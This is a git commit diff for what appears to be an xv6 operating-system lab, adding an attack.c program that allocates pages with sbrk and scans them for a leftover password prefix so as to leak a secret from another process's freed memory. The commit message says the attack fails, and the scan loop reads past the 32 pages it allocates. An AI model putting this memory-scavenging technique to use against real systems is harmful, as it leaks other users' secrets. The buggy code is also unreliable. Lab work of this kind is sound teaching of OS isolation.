26d93d5f268181eb27c451d4dd0931884c301660
vincentwang1517 <vin84526@gmail.com>
2024-11-24 23:18:58 -0800

    Add attack.c - Fail to find the secret

--- user/attack.c
+++ user/attack.c
@@ -3,11 +3,32 @@
 #include "user/user.h"
 #include "kernel/riscv.h"
 
+#define PREFIX "my very very very secret pw is: "
+#define PREFIX_LEN 32
+
 int
 main(int argc, char *argv[])
 {
   // your code here.  you should write the secret to fd 2 using write
   // (e.g., write(2, secret, 8)
 
-  exit(1);
+  char *end = sbrk(32 * PGSIZE);
+
+  // Visit every created page and check if there is key string "my very" in the beginning
+  // Inside page the memory is continuous. We assume the page in which secret.c stored password will be reused.
+  for (int addr_offset = 0; addr_offset < 64 * PGSIZE - 32; addr_offset++)
+  {
+    if (memcmp(PREFIX, end + addr_offset, PREFIX_LEN) == 0) {
+
+      char test[41];
+      test[40] = 0;
+      memcpy(test, end + addr_offset, 40);
+      printf("%s\n", test);
+
+      write(2, end + addr_offset + 32, 8);
+      exit(0);
+    }
+  }
+
+  exit(0);
 }
